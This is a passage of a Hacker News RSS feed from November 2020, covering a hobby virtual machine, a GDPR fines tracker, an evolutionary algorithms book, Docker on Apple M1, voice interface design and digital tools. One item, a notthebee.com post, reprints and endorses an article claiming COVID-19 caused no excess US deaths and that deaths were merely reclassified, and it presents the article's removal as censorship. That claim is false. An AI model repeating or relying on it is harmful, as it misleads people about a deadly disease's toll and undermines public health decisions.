        <li>See <a href="https://github.com/Kully/VLAHB/blob/master/asm/pong.asm">pong.asm</a> for a reference on how to code user input into a game. The <b>INPUT</b> and <b>SHT</b> opcodes are necessary for this.</li>

        <li>Use <i>C</i> syntax highlighting for your text editor for asm files.</li>

        <li>Checkout <a href="https://github.com/Kully/VLAHB/blob/master/asm/sprites.asm">sprite.asm</a> in the repo. It contains 5X5 px sprites for numbers 0-9 and letters A-Z.</li>

        <li>Slots 27141-65535 have no special designation and are free to use for anything you want. You can store variables, perform arithmetic, etc.</li>
    </ol>


    <h4>Debugging</h4>

    <p>Run the following in your terminal to get a 4 byte wide hexdump of the binary file vlahb generated above.</p>

    <pre><code>
$ xxd -c 4 bin/file.bin
    </code></pre>

    <p><img src="http://adamkulidjian.com/imgs/xxd_output.png"></p><p>You can see debug messages as you run <i>vm.c</i> by changing <a href="https://github.com/Kully/VLAHB/blob/master/vm.c#L17">this line</a> to <b>#define DEBUG 1</b>. Warning: it is very slow.</p>

    <p><img src="http://adamkulidjian.com/imgs/debug_in_vm.png"></p><h2>Thank You!</h2>

    <p>Thank you taking the time to read and as always. <b>Feedback is highly …</b></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://adamkulidjian.com/vlahb.html">http://adamkulidjian.com/vlahb.html</a></em></p>]]>
            </description>
            <link>http://adamkulidjian.com/vlahb.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25229404</guid>
            <pubDate>Fri, 27 Nov 2020 15:30:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[GDPR Fines List: Find all GDPR fines and detailed statistics]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25229372">thread link</a>) | @ZeljkoS
<br/>
November 27, 2020 | https://www.privacyaffairs.com/gdpr-fines/ | <a href="https://web.archive.org/web/*/https://www.privacyaffairs.com/gdpr-fines/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><section id="1"><div><div><p>Total Number of GDPR Fines</p><p>410</p><p>Largest Fine</p><p>€50,000,000</p><p> <span>Google Inc.</span> on January 21 , 2019 - France</p></div><div><p>Total Amount of GDPR Fines</p><p>€177,959,174</p><p>Smallest Fine</p><p>€48</p><p> <span>Police Officer</span> on August 17 , 2020 - Estonia</p></div></div><div><div><p>5 Most recent gdpr Fines</p><p>*Only includes finalised cases</p></div><div><p>Top 5 biggest GDPR fines</p><p>*Only includes final &amp; binding fines</p></div></div><section><p><span><b>All data is from official government sources, such as official reports of national Data Protection Authorities.</b></span></p><p><strong>Where are the Marriott and British Airways fines?</strong><br> <span>The Marriott and British Airways cases are not final yet and the fines are just proposals. Other GDPR fines trackers incorrectly report those as final.</span></p><p><i><span>*Because not all fines are made public, some might not be presented on this page. Our aim is to offer the most complete list of GDPR fines available anywhere.</span></i></p><p><em>Last updated: 27 September 2020.</em></p></section></section><div><p>The GDPR fines tracker was initially created as an in-house tool to aid the research process because our writers had found it difficult to get accurate breakdowns of statistics that could be used within articles.</p><p>We quickly decided that turning the tool into a referencable page would not only speed things up further at our end, but could also prove a useful resource for others.</p><p>The GDPR fines tracker we created is the most complete and accurate version we’ve found online. It’s updated regularly and a clear distinction is made between the legal statuses of incomplete cases.</p><p>Having the key data summarised in an easy to read dashboard allows very quick reference and searching when conducting research.</p></div></div></div></div></div></div>]]>
            </description>
            <link>https://www.privacyaffairs.com/gdpr-fines/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25229372</guid>
            <pubDate>Fri, 27 Nov 2020 15:26:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: I Wrote a Book on Evolutionary Algorithms with Python Notebooks]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25229248">thread link</a>) | @DataCrayon
<br/>
November 27, 2020 | https://datacrayon.com/posts/search-and-optimisation/practical-evolutionary-algorithms/preface/ | <a href="https://web.archive.org/web/*/https://datacrayon.com/posts/search-and-optimisation/practical-evolutionary-algorithms/preface/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<div>
<div>

<p>Evolutionary Algorithms (<em>EAs</em>) are a fascinating class of algorithms for meta-heuristic optimisation. There exist many books on the topic of EAs, ranging from their theory to practice. The first book I read on the topic was <em>Genetic algorithms in search, optimization, and machine learning</em> by David E. Goldberg (1989), and to this day I still recommend it to new students in the field.</p>

</div>
</div>
</div><div>

<div>
<p>However, there is a re-occurring difficulty when my students are starting out in the field, <em>"how do I move from theory to practice?"</em>. Most books will have some chapters dedicated to applications of EAs, but what's missing is an up-to-date book dedicated to using modern technology and concepts.</p>
</div>
</div><div>

<div>
<div>
<p>When writing this book, I had to answer some difficult questions:</p>
<ul>
<li>What programming language will my examples be written in?</li>
<li>What software libraries will I use?</li>
<li>How do I structure the chapters and sections, do I lead entirely by example or do I dedicate some parts to the theory?</li>
<li>Do I focus on single-objective EAs or multi-objective EAs?</li>
</ul>
<p>Nevertheless, the decisions had to be made. I selected Python as the programming language simply due to its rise in popularity (in 2019), and this was only a difficult choice because there is a wealth of resources written for MATLAB. Of the resources written in MATLAB, it is a shame to not be able to use PlatEMO, which is a well-maintained open-source platform for Evolutionary Multi-objective Optimisation. In its place, when a software library is needed, I will turn to Platypus, which provides optimisation algorithms and analysis tools for multi-objective optimisation.</p>
<p>For the structure of the chapters and sections, I have decided to lead entirely by example. There will be code to demonstrate every concept used, and I will show how we can implement algorithms from their mathematical representation. In these cases, I will focus on the readability of the implementations rather than their performance.</p>
<p>Finally, I will focus on multi-objective EAs as this represents the majority of real-world problems. However, single-objective EAs will make an appearance to highlight the differences between the two.</p>

</div>
</div>
</div><div>

<div>
<p>Perhaps the most difficult question to answer is <em>where do we start?</em> There is so much to cover, and many potential starting points. For this book, I will start with a definition of objective functions, and illustrate the relationship between what we call the problem space and the objective space. With this approach, I hope there will be a clear understanding of what the various operators within an EA are affecting.</p>
</div>
</div></div>]]>
            </description>
            <link>https://datacrayon.com/posts/search-and-optimisation/practical-evolutionary-algorithms/preface/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25229248</guid>
            <pubDate>Fri, 27 Nov 2020 15:09:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Johns Hopkins published a study saying corona is nbd. They then deleted it.]]>
            </title>
            <description>
<![CDATA[
Score 24 | Comments 40 (<a href="https://news.ycombinator.com/item?id=25229194">thread link</a>) | @URfejk
<br/>
November 27, 2020 | https://notthebee.com/article/a-few-days-ago-johns-hopkins-published-a-study-saying-corona-is-nbd-they-then-deleted-it-read-it-here-in-its-entirety | <a href="https://web.archive.org/web/*/https://notthebee.com/article/a-few-days-ago-johns-hopkins-published-a-study-saying-corona-is-nbd-they-then-deleted-it-read-it-here-in-its-entirety">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div>
                                                                                <p>Johns Hopkins published this study on Sunday which posits that Covid is nowhere near the disaster we're being told it is. I would summarize it for you or offer pull-quotes but honestly you just have to read it yourself because it's mind-blowing. <a target="_blank" href="https://www.jhunewsletter.com/article/2020/11/a-closer-look-at-u-s-deaths-due-to-covid-19">The original article</a> is now deleted from the Johns Hopkins website ... for some reason. Luckily the internet is forever and it's available via<a target="_blank" href="https://web.archive.org/web/20201126223119/https://www.jhunewsletter.com/article/2020/11/a-closer-look-at-u-s-deaths-due-to-covid-19"> the Wayback Machine</a>. Here is the article in its entirety:</p><p>* * *</p><p>According to <a target="_blank" href="https://web.archive.org/web/20201126223119/https://www.theguardian.com/world/2020/nov/21/covid-world-map-which-countries-have-the-most-coronavirus-cases-and-deaths">new data</a>, the U.S. currently ranks first in total COVID-19 cases, new cases per day and deaths. Genevieve Briand, assistant program director of the Applied Economics master's degree program at Hopkins, critically analyzed the effect of COVID-19 on U.S. deaths using data from the Centers for Disease Control and Prevention (CDC) in her webinar titled "COVID-19 Deaths: A Look at U.S. Data."</p><p>From mid-March to mid-September, U.S. total deaths have reached 1.7 million, of which 200,000, or 12% of total deaths, are COVID-19-related. Instead of looking directly at COVID-19 deaths, Briand focused on total deaths per age group and per cause of death in the U.S. and used this information to shed light on the effects of COVID-19.</p><p>She explained that the significance of COVID-19 on U.S. deaths can be fully understood only through comparison to the number of total deaths in the United States.</p><p>After retrieving data on the CDC website, Briand compiled a graph representing percentages of total deaths per age category from early February to early September, which includes the period from before COVID-19 was detected in the U.S. to after infection rates soared.</p><p>Surprisingly, the deaths of older people stayed the same before and after COVID-19. Since COVID-19 mainly affects the elderly, experts expected an increase in the percentage of deaths in older age groups. However, this increase is not seen from the CDC data. In fact, the percentages of deaths among all age groups remain relatively the same.</p><p>"The reason we have a higher number of reported COVID-19 deaths among older individuals than younger individuals is simply because every day in the U.S. older individuals die in higher numbers than younger individuals," Briand said.</p><p>Briand also noted that 50,000 to 70,000 deaths are seen both before and after COVID-19, indicating that this number of deaths was normal long before COVID-19 emerged. Therefore, according to Briand, not only has COVID-19 had no effect on the percentage of deaths of older people, but it has also not increased the total number of deaths.</p><p>These data analyses suggest that in contrast to most people's assumptions, the number of deaths by COVID-19 is not alarming. In fact, it has relatively no effect on deaths in the United States.</p><p>This comes as a shock to many people. How is it that the data lie so far from our perception?</p><p>To answer that question, Briand shifted her focus to the deaths per causes ranging from 2014 to 2020. There is a sudden increase in deaths in 2020 due to COVID-19. This is no surprise because COVID-19 emerged in the U.S. in early 2020, and thus COVID-19-related deaths increased drastically afterward.</p><p>Analysis of deaths per cause in 2018 revealed that the pattern of seasonal increase in the total number of deaths is a result of the rise in deaths by all causes, with the top three being heart disease, respiratory diseases, influenza and pneumonia.</p><p>"This is true every year. Every year in the U.S. when we observe the seasonal ups and downs, we have an increase of deaths due to all causes," Briand pointed out.</p><p>When Briand looked at the 2020 data during that seasonal period, COVID-19-related deaths exceeded deaths from heart diseases. This was highly unusual since heart disease has always prevailed as the leading cause of deaths. However, when taking a closer look at the death numbers, she noted something strange. As Briand compared the number of deaths per cause during that period in 2020 to 2018, she noticed that instead of the expected drastic increase across all causes, there was a significant decrease in deaths due to heart disease. Even more surprising, as seen in the graph below, this sudden decline in deaths is observed for all other causes.</p><mediatag id="57319"></mediatag><p><i>Graph depicts the number of deaths per cause during that period in 2020 to 2018.</i></p><p>This trend is completely contrary to the pattern observed in all previous years. Interestingly, as depicted in the table below, the total decrease in deaths by other causes almost exactly equals the increase in deaths by COVID-19. This suggests, according to Briand, that the COVID-19 death toll is misleading. Briand believes that deaths due to heart diseases, respiratory diseases, influenza and pneumonia may instead be recategorized as being due to COVID-19.</p><mediatag id="57320"></mediatag><p><i>Graph depicts the total decrease in deaths by various causes, including COVID-19.</i></p><p>The CDC classified all deaths that are related to COVID-19 simply as COVID-19 deaths. Even patients dying from other underlying diseases but are infected with COVID-19 count as COVID-19 deaths. This is likely the main explanation as to why COVID-19 deaths drastically increased while deaths by all other diseases experienced a significant decrease.</p><p>"All of this points to no evidence that COVID-19 created any excess deaths. Total death numbers are not above normal death numbers. We found no evidence to the contrary," Briand concluded.</p><p>In an interview with <i>The News-Letter</i>, Briand addressed the question of whether COVID-19 deaths can be called misleading since the infection might have exacerbated and even led to deaths by other underlying diseases.</p><p>"If [the COVID-19 death toll] was not misleading at all, what we should have observed is an increased number of heart attacks and increased COVID-19 numbers. But a decreased number of heart attacks and all the other death causes doesn't give us a choice but to point to some misclassification," Briand replied.</p><p>In other words, the effect of COVID-19 on deaths in the U.S. is considered problematic only when it increases the total number of deaths or the true death burden by a significant amount in addition to the expected deaths by other causes. Since the crude number of total deaths by all causes before and after COVID-19 has stayed the same, one can hardly say, in Briand's view, that COVID-19 deaths are concerning.</p><p>Briand also mentioned that more research and data are needed to truly decipher the effect of COVID-19 on deaths in the United States.</p><p>Throughout the talk, Briand constantly emphasized that although COVID-19 is a serious national and global problem, she also stressed that society should never lose focus of the bigger picture — death in general.</p><p>The death of a loved one, from COVID-19 or from other causes, is always tragic, Briand explained. Each life is equally important and we should be reminded that even during a global pandemic we should not forget about the tragic loss of lives from other causes.</p><p>According to Briand, the over-exaggeration of the COVID-19 death number may be due to the constant emphasis on COVID-19-related deaths and the habitual overlooking of deaths by other natural causes in society.</p><p>During an interview with <i>The</i> <i>News-Letter </i>after the event, Poorna Dharmasena, a master's candidate in Applied Economics, expressed his opinion about Briand's concluding remarks.</p><p>"At the end of the day, it's still a deadly virus. And over-exaggeration or not, to a certain degree, is irrelevant," Dharmasena said.</p><p>When asked whether the public should be informed about this exaggeration in death numbers, Dharmasena stated that people have a right to know the truth. However, COVID-19 should still continuously be treated as a deadly disease to safeguard the vulnerable population.</p><p>* * *</p><p>Facebook and Twitter will certainly block this article within hours of its publication. Just like Johns Hopkins deleted it from its site. The question is ... why?</p><mediatag id="57334"></mediatag><mediatag id="57329"></mediatag><mediatag id="57331"></mediatag><mediatag id="57332"></mediatag><p>* * *</p><p><strong>UPDATE</strong>: JHU tweeted that they deleted the article because it "was being used to support false and dangerous inaccuracies about the impact of the pandemic."</p><mediatag id="57420"></mediatag><p>Importantly, they didn't say anything in the article was incorrect. So we're just memory-holing studies that don't align with the narrative? Got it.</p>
                                    <!--                                 <p>
                    <span class="text-muted text-sm">Last Updated Nov 30th, 2020 at 2:34 pm</span>
                </p>
                 -->
            </div>
        </div></div>]]>
            </description>
            <link>https://notthebee.com/article/a-few-days-ago-johns-hopkins-published-a-study-saying-corona-is-nbd-they-then-deleted-it-read-it-here-in-its-entirety</link>
            <guid isPermaLink="false">hacker-news-small-sites-25229194</guid>
            <pubDate>Fri, 27 Nov 2020 15:01:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Running Docker on Apple Silicon M1 (Follow-Up)]]>
            </title>
            <description>
<![CDATA[
Score 126 | Comments 154 (<a href="https://news.ycombinator.com/item?id=25228786">thread link</a>) | @ingve
<br/>
November 27, 2020 | https://finestructure.co/blog/2020/11/27/running-docker-on-apple-silicon-m1-follow-up | <a href="https://web.archive.org/web/*/https://finestructure.co/blog/2020/11/27/running-docker-on-apple-silicon-m1-follow-up">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div data-layout-label="Post Body" data-type="item" data-updated-on="1606480641864" id="item-5fc0f2d33f75b16643f61aae"><div><div><div data-block-type="44" id="block-3e269a4e320cdf7cc7e4"><div><p data-preserve-html-node="true">This is a follow-up post to <a data-preserve-html-node="true" href="https://finestructure.co/blog/2020/11/27/running-docker-on-apple-silicon-m1">“Running Docker on Apple Silicon M1”</a>, continuing the journey of exploring Docker on Apple’s new M1 machines.</p>

<p data-preserve-html-node="true">We left off at booting an ARM Linux virtual machine, and installing &amp; running Docker inside it. This works fine and allows you run containers like for instance a Postgres database. They can expose their ports and instead of connecting to <code data-preserve-html-node="true">localhost:5432</code> on the host, you connect to your VM’s IP address, for instance <code data-preserve-html-node="true">192.168.64.8:5432</code>.</p>

<p data-preserve-html-node="true">Now in case you’re not aware, Docker is actually a service that exposes an API over HTTP and when you run <code data-preserve-html-node="true">docker</code> commands, they control the service via these API requests on a local socket. You’ve probably seen the reference to <code data-preserve-html-node="true">unix:///var/run/docker.sock</code> at times.</p>

<p data-preserve-html-node="true">What that means is that it’s possible to direct your <code data-preserve-html-node="true">docker</code> client to talk to a Docker service over the network, and that’s what we can do as well to enable “regular” docker commands to work with a locally running “Linux Docker VM”.</p>

<p data-preserve-html-node="true">Incidentally, that’s exactly what “Docker for Mac” is doing under the hood: it is actually a <a data-preserve-html-node="true" href="https://github.com/moby/hyperkit">VM based on Apple’s Hypervisor framework</a> which hosts Docker, not your Mac itself.</p>

<h2 data-preserve-html-node="true">Installing “Docker for Mac”</h2>

<p data-preserve-html-node="true">In order to get started, we need to obtain the Docker client app. I migrated my existing setup from a Time Machine backup and therefore had Docker installed from the start. If you need to install from scratch, <a data-preserve-html-node="true" href="https://docs.docker.com/engine/install/binaries/">installing the client binaries</a> is probably the easiest way to get started.</p>

<p data-preserve-html-node="true">Assuming you have a <code data-preserve-html-node="true">docker</code> binary to hand, you’re good to go. The way we’ll set up the connection is via a “docker context” and all this is <a data-preserve-html-node="true" href="https://twitter.com/johannesweiss/status/1332271974719090688?s=21">thanks to a tip by Johannes Weiss</a>.</p>

<h2 data-preserve-html-node="true">Setting up SSH in virtual machine</h2>

<p data-preserve-html-node="true">First though, we need to configure to connect to our VM via SSH. Install the SSH server:</p>

<pre data-preserve-html-node="true"><code data-preserve-html-node="true">sudo apt-get install openssh-server</code></pre>

<p data-preserve-html-node="true">and copy your public key to the <code data-preserve-html-node="true">ubuntu</code> user’s <code data-preserve-html-node="true">authorized_keys</code> for password-less access.</p>

<p data-preserve-html-node="true">In order to connect to the VM, you’ll need to find its IP address (which is on a <code data-preserve-html-node="true">192.168.64.0</code> network if you’ve followed along from the previous blog post).</p>

<p data-preserve-html-node="true">Our image comes without <code data-preserve-html-node="true">net-tools</code>, so we’ll install these first:</p>

<pre data-preserve-html-node="true"><code data-preserve-html-node="true">sudo apt install net-tools</code></pre>

<p data-preserve-html-node="true">and then run</p>

<pre data-preserve-html-node="true"><code data-preserve-html-node="true">ifconfig <span>|</span> grep 192.168</code></pre>

<p data-preserve-html-node="true">which should yield the following</p>

<pre data-preserve-html-node="true"><code data-preserve-html-node="true"><a href="https://finestructure.co/cdn-cgi/l/email-protection" data-cfemail="7d081f081309083d081f08130908">[email&nbsp;protected]</a>:<span>~</span>$ ifconfig <span>|</span> grep 192.168
        inet 192.168.64.8  netmask 255.255.255.0  broadcast 192.168.64.255</code></pre>

<p data-preserve-html-node="true">With all this out of the way, we can test the connection from the host:</p>

<pre data-preserve-html-node="true"><code data-preserve-html-node="true">ssh <a href="https://finestructure.co/cdn-cgi/l/email-protection" data-cfemail="f08592859e8485b0c1c9c2dec1c6c8dec6c4dec8">[email&nbsp;protected]</a></code></pre>

<figure data-preserve-html-node="true"><img data-preserve-html-node="true" src="https://f000.backblazeb2.com/file/finestructure-public-images/posts/ssh-login.png"></figure>

<h2 data-preserve-html-node="true">Setting up a Docker context</h2>

<p data-preserve-html-node="true">The remaining steps are simple. We create a Docker context:</p>

<pre data-preserve-html-node="true"><code data-preserve-html-node="true">docker context create myvm --docker <span>"host=ssh://<a href="https://finestructure.co/cdn-cgi/l/email-protection" data-cfemail="afdacddac1dbdaef9e969d819e999781999b8197">[email&nbsp;protected]</a>"</span></code></pre>

<p data-preserve-html-node="true">and tell Docker to use it</p>

<pre data-preserve-html-node="true"><code data-preserve-html-node="true">docker context use myvm</code></pre>

<p data-preserve-html-node="true">Now all docker commands are targeting the virtual machine, just like they do in Docker for Mac.</p>

<pre data-preserve-html-node="true"><code data-preserve-html-node="true">❯ docker context create myvm --docker <span>"host=ssh://<a href="https://finestructure.co/cdn-cgi/l/email-protection" data-cfemail="d5a0b7a0bba1a095e4ece7fbe4e3edfbe3e1fbed">[email&nbsp;protected]</a>"</span>
myvm
Successfully created context <span>"myvm"</span>
<span>~</span>
❯ docker context use myvm
myvm
<span>~</span>
❯ docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
<span>~</span>
❯ docker run hello-world

Hello from Docker<span>!</span>
This message shows that your installation appears to be working correctly.

To generate this message, Docker took the following steps:
 1. The Docker client contacted the Docker daemon.
 2. The Docker daemon pulled the <span>"hello-world"</span> image from the Docker Hub.
    (arm64v8)
 3. The Docker daemon created a new container from that image which runs the
    executable that produces the output you are currently reading.
 4. The Docker daemon streamed that output to the Docker client, which sent it
    to your terminal.

To try something more ambitious, you can run an Ubuntu container with:
 $ docker run -it ubuntu bash

Share images, automate workflows, and more with a free Docker ID:
 https://hub.docker.com/

For more examples and ideas, visit:
 https://docs.docker.com/get-started/</code></pre>

<p data-preserve-html-node="true">You can find out more about <code data-preserve-html-node="true">docker context</code> in the <a data-preserve-html-node="true" href="https://docs.docker.com/engine/context/working-with-contexts">online documentation</a>.</p>

<p data-preserve-html-node="true">Bear in mind that this setup does not come with the convenience of Docker for Mac’s bridge networking or support for volumes – but surely these aren’t far off.</p>


</div></div></div></div></div></div></div>]]>
            </description>
            <link>https://finestructure.co/blog/2020/11/27/running-docker-on-apple-silicon-m1-follow-up</link>
            <guid isPermaLink="false">hacker-news-small-sites-25228786</guid>
            <pubDate>Fri, 27 Nov 2020 14:07:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Create Great Voice User Interfaces]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25228748">thread link</a>) | @speechly
<br/>
November 27, 2020 | https://www.speechly.com/blog/voice-application-design-guide/ | <a href="https://web.archive.org/web/*/https://www.speechly.com/blog/voice-application-design-guide/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>For the past 4 years at Speechly, we have been experimenting and developing ways to make use of voice-enabled touch screen apps fast and straight-forward, in other words – more productive. In this article, we'll introduce the concepts and guidelines we've found effective in creating voice enabled apps that are robust and enable users to complete tasks faster and with less attention.</p><p>Our approach takes advantage of customizable voice actions and the availability of a (touch) display for providing real-time visual feedback and options. As a result, the app can be controlled with both the <a href="https://www.speechly.com/blog/what-is-voice-user-interface/">voice user interface (VUI)</a> and the graphic user interface (GUI), allowing the user to choose the best input method for the occasion. A voice interface can be thought of a controller for app actions which makes it <a href="https://www.speechly.com/blog/voice-user-interfaces-for-react/">retrofittable to an existing application</a>.</p><p>We contrast this approach to now-popular voice assistants like Apple’s Siri, Google Home and Amazon Alexa, which are conversational in nature and are typically optimized for generic hands-free use with voice.</p><h2>Setting the right context</h2><h3>1. Don't try to build a voice assistant</h3><p>Voice assistants are digital assistants that react to voice commands, most often by using voice themselves, too. While there are good use cases for voice assistants, their way of using voice is not suitable for touch screen devices.</p><p>Instead of question-answer based dialogues, touch screen voice experiences should be based on real-time visual feedback. As the user speaks, the user interface should be instantaneously updated.</p><h3>2. Users don’t want to converse</h3><p>When we humans talk with each other, we do more than transmit information by using words. We might greet, persuade, declare, ask or apologize and even the same words can have a different meaning, depending on how we say it and in which situations. This is very human-like, but not the way we want to communicate with a computer.</p><p>With voice user interface, speech has only one function and it is to command the system to do what the user wants. Be clear that the user is talking with a computer, don’t try to imitate a human. In most cases, the application should not answer in natural language. It should react by updating the user interface, just like when clicking a button.</p><h3>3. Give visual guidance on what the user can say</h3><p>An issue commonly described in voice user interfaces (VUI) users is the uncertainty related to what commands are supported.</p><p>The problem arises from the fact that the typical voice assistant experience begins from a blank slate, where the assistants start listening and is expected to be able to help the user with pretty much anything. This is of course not really true as anybody who has tried these services understands.</p><p>Understanding the supported functionality with traditional graphical user interfaces (GUI) is less of a problem. Placing a button in the users shopping cart that reads “proceed to checkout” is a very strong signal to the users that checkout is supported and by pressing the button the user will indeed proceed to the checkout process. This aspect is missing from voice-only solutions which cases uncertainty in terms of supported features.</p><p>This is why a good voice user interface should be supported if possible by a graphical user interface.</p><p>Booking air flights - Graphical user interface supporting the voice user interface</p><h3>4. Use voice for the tasks it is good for</h3><p>Good design is about providing the user with the best tools for their use task.</p><p>Voice works great for use tasks such as <a href="https://www.speechly.com/blog/voice-search/">search filtering</a> – “Show me the nearest seafood restaurants with three or more stars”, accessing items from a known inventory – “Add milk, bread, chicken and potatoes”, inputting information: “Book a double room for two in Los Angeles next Friday” and unambiguous commands, such as “Show sports news”.</p><p>On the other hand, touch is often the better option for selecting from a couple of options, typing things such as email addresses and passwords and browsing by scrolling a large unknown inventory, for example.</p><p>There’s no need to replace your current user interface with a voice user interface. Rather you should evaluate which tasks in your application are the most tedious and easiest to do by using voice and add voice as a modality to those features.</p><div><div><div><p>Sign up to our Voice Design Crash Course and learn the best practices for creating great voice user interfaces.</p></div></div></div><h2>Receiving commands from the user</h2><h3>5. Onboard the user</h3><p>When your users first see your voice UI, they will need some guidance on how to use it.</p><p>These examples should be placed close to where the visual feedback will appear. You can hide the examples after the user has tried the voice user interface.</p><h3>6. Avoid using a wake word</h3><p>While voice assistants use a wake word so that they can be activated from a distance, your touch screen application doesn’t need to. Repeating the wake word every time makes the experience jarring, adds latency and decreases the reliability.</p><p>The hands free scenario is far less relevant than you might initially think, as the user is already holding the device. There are also privacy risks involved with a wake word.</p><h3>7. Prefer push-to-talk button mechanism</h3><p>Push-to-talk is the best way to operate a microphone in a multimodal touch screen application. When the user is required to press a button while talking, it’s completely clear when the application is listening. This also decreases latency by making endpointing very explicit, eliminating the possibility of endpoint false positives (system stops listening prematurely) and false negatives (systems does not finalize request after user has finished the command).</p><p>On the desktop you can use the spacebar for activating the microphone.</p><p>You can also add a slide as an optional gesture to lock the microphone for a longer period of time. WhatsApp has a good implementation of the design in their app.</p><h3>8. Signal clearly when the microphone button is pushed down.</h3><p>To make it sure the user knows that the application is listening, signal clearly when the microphone button is pushed down. This is especially important if using the push-to-talk pattern.</p><p>You can use sound, animation, tactile feedback (vibration) or a combination to signal the activation. On a handheld touch screen device, make sure that the activated microphone icon is visible from behind the thumb when push-to-talk is activated.</p><h2>Giving feedback to the user</h2><h3>9. Use non-interruptive modalities for feedback</h3><p>Non-interruptive modalities include haptic, non-linguistic auditory, and perhaps most importantly visual feedback. Using these modalities, the application can react fast and without interruption to the user. For instance, in the case of “I’m interested in t-shirts,” the UI would swiftly show the most popular t-shirt products, instantly enabling the user to continue with a refining utterance, ”do you have Boss.” This narrows further down the displayed products to show only the Boss branded t-shirts.</p><p>On the other hand, voice synthesis is a bad idea for feedback, as any ongoing user utterance will be abruptly interrupted. Voice is also a pretty slow channel for transmitting information and for returning users, hearing the same speech synthesises every time gets annoying very fast.</p><h3>10. Minimize latency with streaming natural language understanding</h3><p>One important part of user experience is the perceived responsiveness of the application. Designers are using tricks such as lazy loading, doing tasks on background, visual illusions and preloading of content to make their applications seem faster and this should be done with voice, too.</p><p>In voice applications, immediate UI reaction is even more important. Immediate UI reaction encourages the user to use longer expression and to continue the voice experience. In case of an error, it enables the user to recover fast.</p><h3>11. Steer user’s gaze and visual attention</h3><p>When using voice effectively the user can control the UI an order of magnitude faster compared to tapping and clicking. This means that a lot of stuff might be happening in the UI. It is important that the user can keep up with these UI reactions.</p><p>Typically UI reactions manifest themselves in some sort of visual queues, micro animations and transitions. There is an instinctive inclination in the human visual cognition system to move visual focus to where movement is happening.</p><p>Therefore it is an antipattern to scatter visual ui reactions all over the visual field of the user, e.g. streaming transcription animation on top of the screen and other ui reactions at the bottom of the screen. This will result in the user's gaze bouncing back and forth on the screen making it very hard to understand what is happening in the user interface and inflicting unnecessary cognitive load and annoyance to the user.</p><p>For this reason it is important to either centralize all visual UI reactions near one focal point,meaning that both the transcript as well as the visual transitions resulting from the user commands are shown very close to each other. The other option is to steer the users gaze linearly on the screen with a cascade of animations happening e.g. top down, left to right.</p><h3>12. Minimize visual unrest in triggered events.</h3><p>While a voice user interface needs to be as close to real-time as possible, minimize flicker and visual unrest. You can use placeholder images and elements to make sure the application looks smooth and reacts fast. Recovering from misinterpretation</p><h3>13. Show the text transcript</h3><p>Text transcription of users’ voice input is the most important part of the feedback in case of an error. Lack of action tells the user their input was not correctly understood, but in case of an error in the speech recognition, the transcript can enable them to understand why that happened.</p><p>Transcript can also be valuable for the user when everything goes right. It tells the user they are being understood and encourages them to continue.</p><p>The transcript should appear always in the same, center place in the users’ field of vision. If you are using Speechly, you can use the …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.speechly.com/blog/voice-application-design-guide/">https://www.speechly.com/blog/voice-application-design-guide/</a></em></p>]]>
            </description>
            <link>https://www.speechly.com/blog/voice-application-design-guide/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25228748</guid>
            <pubDate>Fri, 27 Nov 2020 14:02:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Digital Tools I Wish Existed]]>
            </title>
            <description>
<![CDATA[
Score 300 | Comments 127 (<a href="https://news.ycombinator.com/item?id=25228089">thread link</a>) | @todsacerdoti
<br/>
November 27, 2020 | https://jon.bo/posts/digital-tools/ | <a href="https://web.archive.org/web/*/https://jon.bo/posts/digital-tools/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>My digital life in a nutshell: I discover relevant content I don’t have time to consume, I find time and become overwhelmed with my scattered backlog, I wish the content were in a different format, and then I’m unable to find something again once I’ve consumed it. <a href="https://andymatuschak.org/books/">Not retaining enough</a> is a valid problem but we’ll tackle that one later.</p><p>There’s a lot of generalization in my summary but <strong>the core issue is an extraordinarily high level of friction in the process of finding, organizing, and sharing digital content</strong>. During the past few years I’ve noticed:</p><ul><li><p>The more seamless the acquisition &amp; ingestion, the more engaged I am with the content</p></li><li><p>Insights are just as likely to be found in a 400-page book as in a 40-minute podcast</p></li><li><p>Notes and their subsequent review are essential for long-term retention</p></li><li><p>Recommendations from other humans are as good, if not better, than algorithmic suggestions</p></li></ul><p>In the rest of this post I attempt to explain the digital tools I wish existed, and how the the currently available tools do not suffice. What are also probably lacking are my <a href="https://www.buildingasecondbrain.com/">habits and workflows</a> around this - but I’m looking at tools specifically here.</p><h2 id="queue-management-for-inbound-digital-content">Queue management for inbound digital content&nbsp;<a href="#queue-management-for-inbound-digital-content">#</a></h2><p>Where to begin? Probably the most common problem I see myself and other people dealing with is processing the incoming deluge of articles to read and videos to watch. This isn’t all personal recommendations - it encompasses any and all content I think my future self would appreciate me consuming. A list of issues, roughly by order of appearance:</p><ul><li><p>Content (or links to it) arrive from a variety of sources including text messages from friends, email conversations, tweetstorms and replies, references in books, suggestions in real-world conversations, and more.</p></li><li><p>Every book, article, post, or tweet has the potential to lead to more content.</p></li><li><p>Content is published in a variety of formats 